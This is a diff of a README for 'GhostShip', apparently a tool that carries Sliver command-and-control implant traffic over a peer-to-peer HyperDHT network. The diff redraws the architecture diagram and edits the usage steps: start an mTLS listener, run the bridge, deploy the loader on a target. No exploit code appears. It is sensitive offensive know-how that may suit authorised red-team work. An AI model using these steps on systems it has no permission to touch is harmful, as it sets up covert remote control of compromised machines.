@@ -44,33 +44,33 @@
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────────┐
-│                           OPERATOR SIDE                             │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│   Sliver Console  ──▶  Sliver Server (127.0.0.1:8888)               │
-│                                 │                                   │
-│                                 ▼                                   │
-│                          Holesail Bridge                            │
-│                   (generates connection string)                     │
-│                                 │                                   │
-└─────────────────────────────────┼───────────────────────────────────┘
-                                  │
-                         P2P Network (HyperDHT)
-                                  │
-┌─────────────────────────────────┼───────────────────────────────────┐
-│                                 ▼            IMPLANT SIDE           │
-├─────────────────────────────────────────────────────────────────────┤
-│                        GhostShip Loader                             │
-│               (Embedded HyperDHT + Memory Bridge)                   │
-│                                 │                                   │
-│                                 ▼                                   │
-│                     Memory Bridge (Pipes/FD)                        │
-│                                 │                                   │
-│                                 ▼                                   │
-│                          Sliver Implant                             │
-│                                                                     │
-└─────────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────┐
+│                       OPERATOR SIDE                         │
+├─────────────────────────────────────────────────────────────┤
+│                                                             │
+│  Sliver Console  ───>  Sliver Server (127.0.0.1:8888)       │
+│                               │                             │
+│                               v                             │
+│                        Holesail Bridge                      │
+│                 (generates connection string)               │
+│                               │                             │
+└───────────────────────────────┼─────────────────────────────┘
+                                │
+                       P2P Network (HyperDHT)
+                                │
+┌───────────────────────────────┼─────────────────────────────┐
+│                               v         IMPLANT SIDE        │
+├─────────────────────────────────────────────────────────────┤
+│                      GhostShip Loader                       │
+│             (Embedded HyperDHT + Memory Bridge)             │
+│                               │                             │
+│                               v                             │
+│                   Memory Bridge (Pipes/FD)                  │
+│                               │                             │
+│                               v                             │
+│                        Sliver Implant                       │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
 ```
 
 ---
@@ -85,23 +85,23 @@
 ### Usage
 
 #### Step 1: Start Sliver Server
+Launch the Sliver console and start an mTLS listener:
 ```bash
+# Inside Sliver Shell
 sliver > mtls --lport 8888
 ```
 
-#### Step 2: Start Bridge (Operator Side)
+#### Step 2: Start GhostShip Bridge (Operator Side)
+Establish the P2P bridge to your Sliver listener:
 ```bash
 cd bridge/nodejs
-node bridge.js --port 8888 --secure
+node bridge.js --port 8888
 ```
 
 #### Step 3: Deploy GhostShip (Target Side)
 ```bash
-# Build GhostShip binaries
-make build-all
-
 # Deploy to target
-./implant/dist/ghostship-linux --connect "hs://s000..."
+./ghostship-linux --connect "hs://<key_from_bridge_output>"
 ```
 
 ---
